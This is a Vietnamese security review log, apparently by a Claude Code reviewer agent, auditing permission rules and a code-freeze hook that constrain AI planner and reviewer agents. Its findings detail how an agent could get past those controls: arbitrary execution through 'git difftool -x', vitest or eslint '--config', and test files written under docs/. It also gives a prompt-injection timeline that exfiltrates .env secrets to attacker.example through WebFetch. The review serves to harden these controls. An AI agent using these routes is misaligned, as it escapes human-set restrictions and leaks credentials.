| `BLK-02` | `[BLOCKER]` |            **ĐÃ SỬA** (với vector `--output`)             | Mục 6.3 `$sharedDisallowed` có `Bash(git * --output*)`, `Bash(* --output=*)`, `Bash(* --output *)`. `[URL]` `https://code.claude.com/docs/en/permissions` (Wildcard patterns): "A `*` can go anywhere in the rule", ví dụ `Bash(git log * main)` khớp `git log --output=<file> main` → các deny rule này có hiệu lực. Tuy nhiên cùng lớp lỗi vẫn còn qua vector khác — xem `BLK-03`. |
| `MAJ-04` |  `[MAJOR]`  |                        **ĐÃ SỬA**                         | Mục 3.1.3, 6.3, Risk #1, Wiring Probe 1: bỏ `Write(<path>)`, dùng `Edit(docs/plans/**)`, deny bare `Write` cho `reviewer`, deny path dùng `**`. Khớp `[URL]` (mục Read and Edit).                                                                                                                                                                                                    |
| `MAJ-05` |  `[MAJOR]`  | **ĐÃ SỬA** (nhưng mở rộng bề mặt tấn công — xem `BLK-03`) | `$sharedAllowedBash` đã có `npx vitest run *`, `npm run test:run*`, `npm run verify`, `node scripts/verify-docs.mjs*`, `npx tsc --showConfig`, `npx eslint --print-config *`, `npm ls*`, `npm view *`.                                                                                                                                                                               |
| `MAJ-06` |  `[MAJOR]`  |                        **ĐÃ SỬA**                         | Mục 1.2, 3.2, `[MODIFY]` #26–#29, Bước 5 (5 thao tác đóng), `TC-02(d)`, Wiring Probe 3. `[CMD]` probe `node -e` (Nhóm C, in-memory) mô phỏng nguyên văn Mục 6.1: 4 plan `2026-10-19` đều `Completed` → `false`; trạng thái hiện tại (4 plan Approved + footer) → `true`. `[CMD]` header thực tế: pstack/swap/vitest đều `Status: Approved` + `[PLAN_APPROVED]`.                      |
| `MAJ-07` |  `[MAJOR]`  |                        **ĐÃ SỬA**                         | Mục 1.1, 5 #14, #21, Bước 4.3, Bước 5: xóa nhánh marker (`[SRC]` `.agents/scripts/code-freeze-guard.js:177-191` hiện còn nhánh này), không thêm vào `.gitignore`; `TC-08` và Wiring Probe 3 kiểm tra không còn chuỗi `.plan-approved`.                                                                                                                                               |
| `MIN-03` |  `[MINOR]`  |                        **ĐÃ SỬA**                         | Mục 2.2 dùng 28/8; `.agents/skills/README.md` và `02-quality.md:108` chỉ liệt kê nhóm route.                                                                                                                                                                                                                                                                                         |
| `MIN-04` |  `[MINOR]`  |                        **ĐÃ SỬA**                         | Lọc `datePrefix <= maxDatePrefix`; Risk #2 ghi rõ rủi ro tồn dư của giả mạo hai bước kèm control bù trừ. `[CMD]` probe: `2099-01-01-x.md` (Approved) + 4 plan Completed, `maxDatePrefix: "2026-10-20"` → `false`.                                                                                                                                                                    |

#### 2. Phát Hiện Mới

##### `[BLOCKER]` `BLK-03`: Allowlist Bash của kênh CLI vẫn cho phép **thực thi code tùy ý** (không cần cờ `--output`) → vượt qua Code Freeze, deny `Edit(src/**)` vô hiệu

- **Vị trí**: Mục 1.1 (dòng 45–46), Mục 6.3 (dòng 453–468), Bước 4 (dòng 577–580), Risk #1, Wiring Probe 1, Negative Probe 4.
- **Bằng chứng**:
  - `[URL]` `https://code.claude.com/docs/en/permissions` (Wildcard patterns): "`Bash(ls*)` has no space, so it matches `lsof` too." → `Bash(git diff*)` khớp cả **`git difftool`**.
  - `[SRC]` `C:/Program Files/Git/mingw64/share/doc/git-doc/git-difftool.adoc:90-94`: `-x <command>` / `--extcmd=<command>` — "runs `<command> $LOCAL $REMOTE`". Không deny rule nào trong `$sharedDisallowed` khớp `git difftool -y -x "node ..." HEAD~1`.
  - `[SRC]` `vitest.config.ts:8-11`: không có `test.include` → glob mặc định của vitest nhận mọi `**/*.test.*`, kể cả trong `docs/plans/`. `[CMD]` `npx vitest list --filesOnly` → 143 file, gồm cả `.agents/scripts/code-freeze-guard.test.ts` (ngoài `src/`), chứng tỏ test ngoài `src/` vẫn được chạy.
  - `[CMD]` `npx vitest --help` → `-c, --config <path>`, `-r, --root <path>`, `--dir <path>`. `[SRC]` `node_modules/eslint/lib/options.js` → `option: "config", alias: "c"`. Cả hai đều nạp và thực thi file JS do người gọi chỉ định.
  - `[URL]` (What a Bash rule doesn't match): "a deny or ask rule covers the invocation Claude usually produces and **isn't a security boundary around the program**". (Read and Edit): Read/Edit deny rules "don't apply to … arbitrary subprocesses that read or write files indirectly, like a Python or Node script".
- **Timeline [ADV]** (kênh CLI, nằm ngoài hook Antigravity):
  1. T1 Planner CLI (`dontAsk`, có `Edit(docs/plans/**)` — bao gồm cả `Write`) ghi `docs/plans/x.test.mjs` chứa `fs.writeFileSync(...)` nhắm vào `src/**` hoặc `.agents/hooks.json` | T2 gọi `npx vitest run docs/plans/x.test.mjs` (khớp `Bash(npx vitest run *)`, không cờ nào bị deny) | T3 Node chạy file test → ghi vào `src/**`/`.agents/**`. **Kết cục**: Vượt qua Code Freeze → **LỖI (`[BLOCKER]`)**. Biến thể: `npm run test:run -- --config docs/plans/x.mjs`, `npx eslint --print-config a.ts -c docs/plans/x.mjs`.
  2. T1 Reviewer CLI (không có `Write`) | T2 gọi `git difftool -y -x "<lệnh tùy ý>" HEAD~1` (khớp `Bash(git diff*)`) | T3 lệnh tùy ý được thực thi. **Kết cục**: **LỖI (`[BLOCKER]`)**, không cần ghi file trước.
- **Hệ quả**: Risk #1 (Cao) dựa vào control không có hiệu lực → theo `evidence-bar.md` §4.5.4 là `[BLOCKER]`. Các Probe ở Mục 9.3 chỉ kiểm tra tĩnh sự **có mặt** của deny rule, không chứng minh được rule đó chặn đúng.
- **Yêu cầu** (gợi ý; Planner chọn và chứng minh):
  1. Thêm dấu cách trước `*` cho mọi rule tiền tố (`Bash(git diff *)`, `Bash(git log *)`, `Bash(git show *)`, `Bash(git status *)`, `Bash(git blame *)`, `Bash(npm ls *)`, `Bash(node scripts/verify-docs.mjs *)`, `Bash(npm run test:run)`) và thêm deny `Bash(git difftool*)`.
  2. Thu hẹp quyền ghi xuống chỉ file Markdown: `Edit(docs/plans/*.md)` thay cho `**`, để không tạo được file `.mjs`/`.ts` có thể thực thi.
  3. Deny các cờ nạp code: `Bash(* --config*)`, `Bash(* -c *)`, `Bash(* --root*)`, `Bash(* --dir*)`, `Bash(* --globalSetup*)`, `Bash(* --setupFiles*)`; hoặc chỉ cho phép dạng cố định như `Bash(npx vitest run .agents/scripts/code-freeze-guard.test.ts)`.
  4. Cân nhắc bật Claude Code sandbox (`[URL]` `https://code.claude.com/docs/en/sandboxing`) để chặn ghi ở cấp hệ điều hành, vì tài liệu chính thức khẳng định Bash deny rule không phải ranh giới bảo mật.
  5. Bổ sung Negative Probe cho `git difftool -x`, `vitest --config`, và file `*.test.mjs` trong `docs/plans/`; cập nhật Mục 3.1.3, Risk #1, `TC-08`.

##### `[MAJOR]` `MAJ-08`: Kênh CLI đọc được secrets `.env.local` và có `WebFetch` không giới hạn → vi phạm `allowlist.md` (CẤM đọc `.env*`), có rủi ro rò rỉ qua prompt injection

- **Bằng chứng**: `[CMD]` `ls -a` → `.env.local` tồn tại ở repo root. `[URL]` (Permission modes): `dontAsk` — "file reads in your working directories … still run" → kể cả không liệt kê `Read`, `.env.local` vẫn đọc được. `[URL]` (Read and Edit): khuyến nghị deny `Read(./.env)`; Read deny cũng áp dụng cho `cat`/`head`/`tail` trong Bash. `[SRC]` `.agents/agents/reviewer/allowlist.md` (CẤM TUYỆT ĐỐI): "Đọc hoặc in secrets (`.env*` …)". Mục 6.3 tuyên bố "phân quyền tối thiểu, đồng bộ allowlist" nhưng không có deny nào cho secrets, trong khi `WebFetch` (bare) gửi được dữ liệu tới mọi domain.
- **Timeline [ADV]**: T1 Planner `WebFetch` một trang có prompt injection | T2 `Read .env.local` (được tự động cho phép) | T3 `WebFetch https://attacker.example/?k=<secret>`. **Kết cục**: Rò rỉ credential → LỖI.
- **Yêu cầu**: Thêm `Read(.env*)` (gitignore semantics, khớp mọi độ sâu) vào `$sharedDisallowed`, kèm Wiring/Negative Probe ở Mục 9.3 và `TC-08`.

##### `[MAJOR]` `MAJ-09`: Bản phác thảo `isPlanApproved()` ở Mục 6.1 lệch hợp đồng API so với code và test thật (bỏ `export`, dùng hằng số không tồn tại `ROOT`)

- **Bằng chứng**: `[SRC]` `.agents/scripts/code-freeze-guard.js:33` khai báo `export const REPO_ROOT`; không có `ROOT`. `[SRC]` `.agents/scripts/code-freeze-guard.js:176` hiện là `export function isPlanApproved()`, được import ở `[SRC]` `.agents/scripts/code-freeze-guard.test.ts:12` và gọi ở `:595-598`. Mục 6.1 (dòng 362–364) lại viết `function isPlanApproved()` (bỏ `export`) và `path.join(ROOT, "docs", "plans")`.
- **Hệ quả**: Làm đúng nguyên văn bản phác thảo thì (a) test `isPlanApproved` gãy (`isPlanApproved is not a function`), và sửa test để hợp thức hóa sẽ vi phạm Test Failure Triage (Loại A); (b) `ROOT` gây `ReferenceError`, bị `catch {}` nuốt mất → `isPlanApproved()` **luôn trả `false`**, repo bị khóa vĩnh viễn kể cả khi plan đã Approved. `tsc` (`allowJs` + `// @ts-check`) có thể bắt được lỗi (b), nhưng bản phác thảo chính là hợp đồng cho người thực thi (cùng lớp lỗi với `BLK-01`).
- **Yêu cầu**: Giữ `export function isPlanApproved()`, dùng `REPO_ROOT`; ghi rõ test `:595` được giữ nguyên, hoặc bổ sung vào `TC-02` một test tích hợp.

##### `[MINOR]` `MIN-05`: `$resolvedArtifactFile` được tính nhưng không dùng ở `Copy-Item`; `GetFullPath` phân giải theo cwd của tiến trình chứ không theo `Get-Location`

- `[SRC]` `.agents/scripts/run-claude.ps1:184-188` dùng `$ArtifactFile` thô cho `Split-Path`/`New-Item`/`Copy-Item`, và Bước 4 không yêu cầu đổi sang `$resolvedArtifactFile`. Với đường dẫn tương đối, `[System.IO.Path]::GetFullPath` (theo `[Environment]::CurrentDirectory`) và `Copy-Item` (theo PS location) có thể phân giải ra hai đích khác nhau. Khuyến nghị: bắt buộc `[System.IO.Path]::IsPathRooted($ArtifactFile)` và dùng `$resolvedArtifactFile` ở mọi bước sau.

#### 3. Plan Completeness Gate (7 Hạng Mục)

|  #  | Hạng mục                                |      Kết quả       | Ghi chú                                                                                                                                                                                                                                                                                                |
| :-: | :-------------------------------------- | :----------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  1  | Bảng Verified Versions 2026             |        PASS        | Mục 4; khớp `package.json` (đã kiểm ở Audit Run 4).                                                                                                                                                                                                                                                    |
|  2  | Checklist `[NEW]`/`[MODIFY]`/`[DELETE]` |        PASS        | 2/3/29 file, đủ 4 plan `2026-10-19`. `[CMD]` `grep -rln '\.agents/workflows'` (ngoài `docs/plans/`) → `planner/agent.md`, `02-quality.md`, `claude-planner-prompt.md`, `docs/CHANGELOG.md` (đã được loại trừ ở `[2/5]`), `scripts/verify-docs.mjs` (không phải `.md`). Tất cả đều có trong `[MODIFY]`. |
|  3  | Verification Plan & Probes              |      **FAIL**      | Probe cho kênh CLI chỉ kiểm tra chuỗi tĩnh; thiếu Negative Probe cho các vector thực thi code (`BLK-03`) và secrets (`MAJ-08`).                                                                                                                                                                        |
|  4  | Test Contract                           | PASS (cần bổ sung) | TC-01..TC-09; cần bổ sung theo `MAJ-09`.                                                                                                                                                                                                                                                               |
|  5  | Assumptions & Cross-Task Dependencies   |      **FAIL**      | Giả định 3.1.3(d) "deny các cờ ghi file là đủ" bị `[URL]` bác bỏ ("isn't a security boundary") — `BLK-03`.                                                                                                                                                                                             |
|  6  | Out of Scope                            |        PASS        | Mục 1.2.                                                                                                                                                                                                                                                                                               |
|  7  | Skills Loaded & Applied                 |        PASS        | Mục 2.2 trích dẫn 5 `SKILL.md`; task không chạm domain runtime streaming/DB/UI.                                                                                                                                                                                                                        |

#### 4. Mental Simulation Matrix (S1–S6 + Domain)

| Kịch bản                           | Kết quả  | Bằng chứng                                                                                                                                                                                                                                                              |
| :--------------------------------- | :------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S1 Cold-start & Build              | **FAIL** | `[CMD]` `npm run type-check` → exit 0; `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`. Nhưng bản phác thảo 6.1 dùng `ROOT` không tồn tại và bỏ export mà test đang import (`MAJ-09`).                             |
| S2 Lifecycle & Teardown            |   PASS   | Hàm thuần nhận `planEntries` (Mục 6.1); `decide()` inject `options.planApproved` (`[SRC]` `code-freeze-guard.js:541-542`) → test không phụ thuộc fs, không mock vòng tròn.                                                                                              |
| S3 Database & Temporal             |   PASS   | Không chạm DB. `[CMD]` probe `node -e` theo đúng logic Mục 6.1: sau Bước 5 → `false`; `2099-…` → `false`; cùng ngày có plan pending → `false`; plan `2026-10-21` với `maxDatePrefix` `2026-10-21` → `true` (cửa sổ +1 ngày, chấp nhận theo thiết kế, đã ghi ở Risk #4). |
| S4 Cross-Task State                |   PASS   | `[CMD]` header và dòng không rỗng cuối của 4 plan `2026-10-19-*`: pstack/swap/vitest `Approved` + `[PLAN_APPROVED]`, governance `Ready for Review` → đã được đưa đủ vào Bước 5.                                                                                         |
| S5 Security Boundary               | **FAIL** | `BLK-03` (thực thi code qua `git difftool -x`, `vitest`/`eslint` `--config`, file test trong `docs/plans/`), `MAJ-08` (secrets). Phần `-ArtifactFile` PASS (có lưu ý `MIN-05`).                                                                                         |
| S6 External Resilience             |   PASS   | `[SRC]` `run-claude.ps1:164-179` giữ cơ chế phát hiện quota → `exit 42`; plan không đổi phần này.                                                                                                                                                                       |
| Domain (Governance / Model Roster) |   PASS   | `[CMD]` `node scripts/verify-docs.mjs --strict-shorthand` → `[1/5]`–`[4/5]` PASS, `[5/5]` FAIL (130,991 bytes, Total 112): đúng baseline mà Bước 5 sẽ xử lý.                                                                                                            |

#### 5. Adversarial Timelines (4 trục)

1. **Đồng thời**: T1 Planner tạo plan `2026-10-20` (`Ready for Review`) | T2 Orchestrator ghi `src/` | T3 nhóm ngày mới nhất có plan pending → `false`. **AN TOÀN**.
2. **TOCTOU**: T1 `run-claude.ps1` kiểm tra `-ArtifactFile` bằng `GetFullPath` | T2 `Copy-Item` dùng `$ArtifactFile` thô với base path khác | T3 đích ghi có thể khác đích đã kiểm tra. **LỖI** (`[MINOR]` `MIN-05`; chỉ xảy ra với đường dẫn tương đối).
3. **Thất bại giữa chừng**: T1 Bước 5 đóng `Completed` cho 3 plan cũ | T2 tiến trình dừng trước khi đóng plan hiện tại | T3 nhóm `2026-10-19` = 3 Completed + 1 Approved → `true` (repo vẫn mở). Khôi phục được bằng cách chạy lại thao tác 5; thứ tự đóng plan hiện tại sau cùng là đúng ý đồ. **AN TOÀN** (chấp nhận được).
4. **Môi trường / kênh thực thi**: hook Antigravity không bao phủ tiến trình Claude CLI; `[URL]` khẳng định Bash deny rule không phải ranh giới bảo mật → `BLK-03`. **LỖI** (`[BLOCKER]`).

#### 6. Commands Executed

- `wc -l`/`wc -c` các file plan, rules, agents; `grep -n '^#'` trên file kế hoạch; `git diff --stat`.
- Đọc header và dòng không rỗng cuối của 4 file `docs/plans/2026-10-19-*.md`; `ls docs/plans`.
- `grep` `package.json` (scripts `lint`, `type-check`, `test:run`, `verify`); đọc `vitest.config.ts`; `tsconfig.json` (`allowJs`).
- `cat -n .agents/scripts/run-claude.ps1`; `grep`/`sed` trên `.agents/scripts/code-freeze-guard.js` (dòng 21–71, 160–240, 455–475) và `.agents/scripts/code-freeze-guard.test.ts` (dòng 1–20, 590–605).
- `npm run type-check` → exit 0.
- `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`.
- `npx vitest list --filesOnly` → 143 file; `npx vitest --help` (`--config`, `--root`, `--dir`).
- `node scripts/verify-docs.mjs --strict-shorthand` → exit 1 (`[5/5]` FAIL, baseline).
- `grep -rln '\.agents/workflows'` (loại `node_modules`, `.git`, `.next`, `docs/plans/`).
- `ls -a | grep -i env`.
- Đọc `git-difftool.adoc:90-94` (Git for Windows) và `node_modules/eslint/lib/options.js` (option `config`).
- `node -e` (Nhóm C, in-memory, không I/O): mô phỏng `evaluateLatestDateGroupPlans` với 5 kịch bản.
- WebFetch `https://code.claude.com/docs/en/permissions`.

#### 7. Dismissed Findings

- **Nghi vấn deny rule có `*` ở đầu (`Bash(* --output=*)`) không có hiệu lực**: Loại bỏ — `[URL]` "A `*` can go anywhere in the rule: at the start, in the middle, or at the end"; cảnh báo lúc khởi động chỉ áp dụng cho allow rule.
- **Nghi vấn hook Antigravity cho phép `git difftool`**: Loại bỏ cho kênh Antigravity — regex `READ_ONLY_COMMANDS` của plan (`^git (?:status|diff|log|show|blame)(?: \S+)*$`) yêu cầu dấu cách sau `diff`, nên `git difftool` → `ask`. Lỗi chỉ có ở kênh CLI (`BLK-03`).
- **Nghi vấn `[2/5]` FAIL do `docs/CHANGELOG.md` nhắc `.agents/workflows/`**: Loại bỏ — `[SRC]` `scripts/verify-docs.mjs:117-121` đã loại trừ `docs/archive/` và `docs/CHANGELOG.md`.
- **Nghi vấn ngân sách `always_on` `< 18,000 chars` không khả thi**: Chưa đủ bằng chứng để coi là lỗi; `TC-08` đã chặn ở cổng kiểm thử.

#### 8. Kết Luận & Việc Cần Làm Cho Planner (Revision 6)

1. `BLK-03`: Đóng các vector thực thi code ở kênh CLI (`git diff*` → `git difftool -x`; `vitest`/`eslint` `--config`; file `*.test.mjs`/`*.mjs` trong `docs/plans/**`): thêm dấu cách trước `*`, thu hẹp thành `Edit(docs/plans/*.md)`, deny các cờ nạp config, cân nhắc sandbox; thêm Negative Probe; cập nhật Mục 3.1.3, 6.3, Risk #1, `TC-08`.
2. `MAJ-08`: Deny `Read(.env*)` cho cả 2 Role, kèm probe.
3. `MAJ-09`: Sửa Mục 6.1 thành `export function isPlanApproved()` và dùng `REPO_ROOT`; giữ test hiện có hoặc bổ sung test tích hợp.
4. `MIN-05`: khuyến nghị, không chặn.

[CHANGES_REQUESTED]

### Audit Run 6

[REVIEWER_MODEL: claude-code-cli (fallback)]

- **Reviewer**: Claude Code CLI (Fallback Reviewer)
- **Ngày**: 2026-10-23
- **Đối tượng**: Revision 6 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[CHANGES_REQUESTED]` (1 `[BLOCKER]`, 1 `[MAJOR]`, 1 `[MINOR]`)

#### 1. Kiểm Chứng Lỗi Cũ (Từ Audit Run 5)

| Mã Lỗi   |   Mức Độ    |    Trạng Thái    | Bằng Chứng                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| :------- | :---------: | :--------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `BLK-03` | `[BLOCKER]` | **SỬA MỘT PHẦN** | Đã đóng 3/4 vector: (1) `git difftool -x`: `[CMD]` `node -e` → regex `^git (?:status\|diff\|log\|show\|blame)(?: \S+)*$` với `git difftool -y -x "node e.js" HEAD~1` → `false`; allow rule đã có dấu cách (`Bash(git diff *)`) cùng deny `Bash(git difftool*)`. (2) `--config`/`-c`: `[CMD]` `MUTATING_FLAGS` mới khớp `npx vitest run --config …` và `npx eslint --print-config a.ts -c x.mjs` → `true`; không có false positive với `npm run type-check`, `node scripts/verify-docs.mjs --strict-shorthand --expected-headings=113`, `git log -n 5 --oneline`. (3) File thực thi trong `docs/plans/`: Gate 3 `.md`-only + `Edit(docs/plans/*.md)`. **Chưa đóng**: cùng lớp lỗi vẫn còn qua `docs/**` bên ngoài `docs/plans/`, và Lớp 1 còn làm vector này rộng hơn. Xem `BLK-04`. |
| `MAJ-08` |  `[MAJOR]`  |    **ĐÃ SỬA**    | `$sharedDisallowed` có `Read(.env*),Read(**/.env*)`; `[URL]` `https://code.claude.com/docs/en/permissions` §Precedence: "Claude Code evaluates deny and ask rules regardless of what a PreToolUse hook returns" → deny rule vẫn có hiệu lực kể cả khi Lớp 1 hỏng. Có thêm Read Guard trong `decide()`, `TC-05(d)` và Negative Probe 4.                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `MAJ-09` |  `[MAJOR]`  |    **ĐÃ SỬA**    | Mục 6.1 dòng 369–371: `export function isPlanApproved()` + `path.join(REPO_ROOT, "docs", "plans")`. Khớp `[SRC]` `.agents/scripts/code-freeze-guard.js:33` (`export const REPO_ROOT`). `TC-02(f)` giữ test `:595-598`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `MIN-05` |  `[MINOR]`  |    **ĐÃ SỬA**    | Mục 6.3 dòng 511–533, 574–580: kiểm tra `IsPathRooted` → `exit 43`; `$resolvedArtifactFile` được dùng ở `Split-Path`, `New-Item` và `Copy-Item`.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |

#### 2. Phát Hiện Mới

##### `[BLOCKER]` `BLK-04`: Vẫn thực thi được code tùy ý qua file test đặt trong `docs/**` (ngoài `docs/plans/`). Lớp 1 còn mở rộng thêm quyền của Planner CLI, vì hook trả `allow` sẽ bỏ qua bước auto-deny của `dontAsk`

- **Vị trí**: Mục 1.1 (dòng 40–45), Mục 3.1.3 (Lớp 1, Lớp 2), Mục 6.2 (dòng 407–462), Mục 6.3 (dòng 544–558), Risk #1, `TC-04`, Negative Probe 3.
- **Bằng chứng**:
  - `[SRC]` `.agents/scripts/code-freeze-guard.js:39`: `UNFROZEN_PREFIXES = ["docs/"]`; `:462-467`: mọi đường dẫn bắt đầu bằng `docs/` → `{ decision: "allow" }`. Mục 6.2 chỉ thêm kiểm tra `.md` cho `docs/plans/`, nên `docs/notes/x.test.mjs` vẫn được `allow`.
  - `[CMD]` `node -e` (Nhóm C, import module, gọi `decide()` thuần, không ghi file) trên code hiện tại; plan không đổi các nhánh này: `Write docs/notes/x.test.mjs` → `allow`; `npx vitest run docs/notes/x.test.mjs` → `allow`; `npm run test:run -- docs/notes/x.test.mjs` → `allow`. `[SRC]` `vitest.config.ts:7-11` không có `test.include` (chỉ có `exclude: ["tests/e2e/**", "node_modules/**"]`), nên glob mặc định nhận file `docs/**/*.test.mjs`.
  - `[URL]` `https://code.claude.com/docs/en/permissions` §Extend permissions with hooks: "The hook output can deny the tool call, force a prompt, or **skip the prompt to let the call proceed**." §Precedence: chỉ có deny/ask rule là được đánh giá bất kể hook trả gì. Mục `dontAsk`: "Auto-denies every call that would otherwise prompt". Vì vậy, khi hook trả `allow` cho một lệnh **không có trong `--allowedTools`**, lệnh đó sẽ không còn bị auto-deny nữa.
- **Timeline [ADV]** (kênh Planner CLI, `dontAsk`, Lớp 1 hoạt động đúng như Mục 6.2):
  - T1: Planner gọi `Write docs/notes/x.test.mjs` chứa `fs.writeFileSync("src/…")`. Lệnh này không có trong allowlist (`Edit(docs/plans/*.md)`) và không khớp deny nào (`Edit(src/**)`, `.agents/**`, `scripts/**`, `supabase/**`, `tests/**`). Hook: `decide()` → `allow` (Gate 3 `docs/`) → `formatHookOutput` → `permissionDecision: "allow"` → bỏ qua prompt, **ghi thành công**.
  - T2: Planner gọi `npx vitest run docs/notes/x.test.mjs`. Lệnh khớp `Bash(npx vitest run *)`, hook → `allow`.
  - T3: Node chạy file test và ghi vào `src/**` / `.agents/**`.
  - **Kết cục**: vượt qua Code Freeze, deny `Edit(src/**)` mất tác dụng → **LỖI (`[BLOCKER]`, bảo mật)**.
  - Kênh Antigravity có cùng lỗi: `write_to_file docs/notes/x.test.mjs` → `allow`, rồi `run_command npx vitest run docs/notes/x.test.mjs` → `allow`. Điều này trái với tuyên bố ở Mục 3.1.3 Lớp 2 là "triệt tiêu hoàn toàn vector tạo file thực thi".
- **Yêu cầu**:
  1. Trong kênh Claude CLI, `formatHookOutput` chỉ được phép **thắt chặt**, không được nới quyền: ánh xạ guard `allow` → `"defer"` (hoặc không ghi `hookSpecificOutput`), chỉ phát `deny`/`ask` khi `decide()` trả `ask`. Như vậy `--allowedTools` vẫn là trần quyền.
  2. Mở rộng Gate 3 để toàn bộ `UNFROZEN_PREFIXES` (`docs/**`) và `UNFROZEN_FILES` chỉ nhận đuôi không thực thi (ví dụ chỉ `.md`). Cách khác: thêm `docs/**` vào `test.exclude` của `vitest.config.ts` (thuộc `TEST_INFRA_FILES`, cần đưa vào `[MODIFY]`).
  3. Bổ sung `TC-04(c)`: `Write`/`write_to_file` vào `docs/notes/x.test.mjs` → `ask`. Bổ sung `TC-05(e)`: `formatHookOutput({ decision: "allow" }, { hook_event_name: "PreToolUse", permission_mode: "dontAsk" })` → `permissionDecision === "defer"` (hoặc không có `hookSpecificOutput`). Thêm các case này vào Negative Probe 3 và Risk #1.

##### `[MAJOR]` `MAJ-10`: Kết quả JSON của `formatHookOutput` vẫn giữ trường `decision` ở cấp gốc (`"ask"`/`"allow"`), là trường không hợp lệ với `PreToolUse` của Claude Code. Khi JSON không qua được schema validation, Claude Code coi đó là lỗi không chặn (non-blocking), nên Lớp 1 có thể bị bỏ qua mà không có cảnh báo; hook bị crash cũng cho lệnh chạy tiếp

- **Vị trí**: Mục 6.2 dòng 483–490 (`return { ...result, hookSpecificOutput: … }`), Mục 6.3 dòng 558 (`$claudeHookSettings` không có `onFailure`), `TC-05(c)`.
- **Bằng chứng**:
  - `[URL]` `https://code.claude.com/docs/en/hooks` (Decision control): "PreToolUse | `hookSpecificOutput` | `permissionDecision` (allow/deny/ask/defer)". Trường `decision` ở cấp gốc không thuộc cơ chế quyết định của `PreToolUse`.
  - Cùng trang (Exit code 0): "JSON that can't be parsed or fails schema validation | **Non-blocking error**". `onFailure`: "Without it, invalid JSON is a non-blocking error and the action proceeds".
  - `[SRC]` `.agents/scripts/code-freeze-guard.js:718` hiện ghi `JSON.stringify(result)` với `decision: "ask"`. Mục 6.2 giữ nguyên `...result`.
- **Hệ quả**: Các kết luận "deny" của Lớp 1 (Read `.env*`, Self-Forgery Guard, `.md`-only) không được chứng minh là có hiệu lực ở kênh CLI. Risk #1 (Cao) đang dựa vào một control chưa xác minh (`evidence-bar.md` §4.5.4). `TC-05(c)` chỉ kiểm tra `hookSpecificOutput.permissionDecision`, không kiểm tra rằng output không chứa trường cấp gốc không hợp lệ.
- **Yêu cầu**:
  1. Với payload `hook_event_name === "PreToolUse"`, chỉ trả về `{ hookSpecificOutput: { hookEventName, permissionDecision, permissionDecisionReason } }`, không spread `result`.
  2. Thêm `"onFailure": "block"` vào hook trong `$claudeHookSettings`.
  3. Mở rộng `TC-05(c)`: `expect(out).not.toHaveProperty("decision")`.
  4. Thêm Wiring Probe: chạy `node .agents/scripts/code-freeze-guard.js` với payload mẫu của Claude CLI qua stdin, rồi đối chiếu output với schema đã trích dẫn.

##### `[MINOR]` `MIN-06`: Vì hook trả `allow` cho `run-claude.ps1` và `claude -p ping`, Planner CLI có thể tự gọi `run-claude.ps1 -Role reviewer` từ bên trong phiên của mình

- `[CMD]` `decide({ command: "powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -Role reviewer -PlanFile docs/plans/a.md" })` → `allow`. Lệnh này không có trong `--allowedTools` của CLI. Nếu `BLK-04` được sửa theo hướng `allow` → `defer` thì vấn đề này tự hết. Nếu không, cần thêm deny `Bash(powershell *)` và `Bash(claude *)` vào `$sharedDisallowed`.

#### 3. Plan Completeness Gate (7 Hạng Mục)

|  #  | Hạng mục                                |      Kết quả       | Ghi chú                                                                                                                                                                               |
| :-: | :-------------------------------------- | :----------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|  1  | Bảng Verified Versions 2026             |        PASS        | Mục 4; `package.json` không đổi (đã kiểm ở Run 4–5).                                                                                                                                  |
|  2  | Checklist `[NEW]`/`[MODIFY]`/`[DELETE]` | PASS (cần bổ sung) | 2/3/29. Nếu chọn cách sửa `vitest.config.ts` cho `BLK-04` thì phải thêm file này.                                                                                                     |
|  3  | Verification Plan & Probes              |      **FAIL**      | Không có Negative Probe cho `docs/**` ngoài `docs/plans/` và cho hook `allow` nới quyền (`BLK-04`). Không có probe kiểm tra output thật so với schema hook của Claude CLI (`MAJ-10`). |
|  4  | Test Contract                           | PASS (cần bổ sung) | Cần `TC-04(c)`, `TC-05(c)` mở rộng, `TC-05(e)`.                                                                                                                                       |
|  5  | Assumptions & Cross-Task Dependencies   |      **FAIL**      | Giả định 3.1.3 Lớp 1/Lớp 2 ("triệt tiêu hoàn toàn") bị `[CMD]` + `[URL]` bác bỏ. Mục 3.2: `[CMD]` header của 4 plan `2026-10-19` khớp mô tả.                                          |
|  6  | Out of Scope                            |        PASS        | Mục 1.2.                                                                                                                                                                              |
|  7  | Skills Loaded & Applied                 |        PASS        | Mục 2.2 trích dẫn 5 `SKILL.md`; task không chạm domain streaming/DB/UI runtime.                                                                                                       |

#### 4. Mental Simulation Matrix (S1–S6 + Domain)

| Kịch bản                           | Kết quả  | Bằng chứng                                                                                                                                                                                                                                                                                                             |
| :--------------------------------- | :------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S1 Cold-start & Build              |   PASS   | `[CMD]` `npm run type-check` → exit 0. `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`. Mục 6.1 dùng `REPO_ROOT`/`export` đúng với `[SRC]` `:33`. Không có dependency mới.                                                                                        |
